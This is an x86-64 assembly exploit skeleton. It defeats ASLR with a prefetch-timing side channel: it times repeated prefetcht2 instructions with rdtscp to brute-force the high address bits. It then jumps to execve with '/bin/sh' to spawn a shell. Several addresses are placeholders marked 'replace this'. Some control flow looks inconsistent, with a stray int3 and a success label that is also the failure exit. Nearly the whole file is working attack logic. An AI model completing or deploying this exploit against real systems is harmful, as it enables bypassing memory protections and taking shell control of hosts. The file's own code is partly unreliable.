global _start

; rsi ---> temporary storage  [time bfr prefetching]
; rbx ---> temporary storage  [time after prefetching]
; rax ---> used for division
; rdi ---> temporary storage
; r8  ---> address iterator
; r9  ---> temporary storage
; r11 ---> full addr
; r10  ---> the time that prefetch took
; r12 ---> average
; r13 ---> latest time stamp counter
; r15 ---> temporary storage
section .text
_start:
	mov r8, 0x1000;
	mov r12, 0;
	mov r13, 1;
	jmp _bruteforce;

_bruteforce :
	mov rsp, 0xffffffff;
	mov rbp, 0xffffffff;		; replace this with writable addr
	cmp r8, 0xffff;			; simple loop
	je _ok;				; once rdi equals 0xffff the exploit failed for some reason
	mov r11, 0x69696969;		; replace with real partial leak
	call _assemble_addr;
	call _rdtscp;
	mov rsi, rax;			; moving starting time
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	prefetcht2 [r11];
	call _rdtscp;
	mov rbx, rax;			; moving ending time
	mov r10, rbx;
	sub r10, rsi;			; adding to the average
	add r12, r10;			; r10 in this case is the time stamp of prefetch
	mov rax, r13;			; checking if the 30% latest time stamp is bigger than our time
					; stamp, if yes that means that the addr is fetched from the cache
	imul rax, rax, 30;
	xor rdx, rdx;
	mov rcx, 100;
	div rcx;
	cmp r10, rax;			; comparing the current ts with 30% latest ts if ths less we jump
					; to code execution
	jl _ok;
					; well not this time, we need to check if the average of fetching
					; operations is not that far from the latest time stamp, cause 
					; some times cpu needs to go on a cpu walk that takes time. this
					; could interfere with our calculations
	int3;
	add r8, 1;
	mov rcx, r8;			; r11 will be our index
	sub rcx, 0x1000;
	mov rax, r12;
	xor rdx, rdx;
	div rcx;
	imul rax, rax, 2;
	cmp rax, r10;
	jl _bruteforce;
	mov r13, r10;
	jmp _bruteforce;
	;; preforming checks



_assemble_addr :		;; r11 contains half add and rdi contains addr iter
	mov rdi, r8;
	sal rdi, 32;
	or rdi, r11;
	mov r11, rdi;
	ret;

_rdtscp :
	rdtscp;
	shl rdx, 32;
	or rax, rdx;
	ret;

_ok : 		; aslr broken ready to call sys from libc
	mov rax, r11;
	sub rax, 0xfffffff;		; replace this with libc puts addr
	mov rdi, rax;
	add rdi, 0xffffffff;		; replace this with /bin/sh addr
	mov rsi, 0;
	mov rdx, 0;
	mov r8, rax;
	add r8, 0xffffffffff;		; replace this with execve addr
	jmp r8;
	ret;
